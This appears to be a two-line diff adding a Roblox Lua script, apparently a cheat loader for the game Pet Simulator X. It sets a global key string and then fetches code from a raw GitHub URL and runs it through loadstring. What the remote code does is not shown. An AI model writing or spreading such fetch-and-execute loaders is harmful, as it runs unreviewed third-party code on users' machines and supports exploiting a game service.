@@ -1,0 +1,2 @@
+_G.Key = "dropknifepls12345hac"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/PetSimX/main/Mel"))()
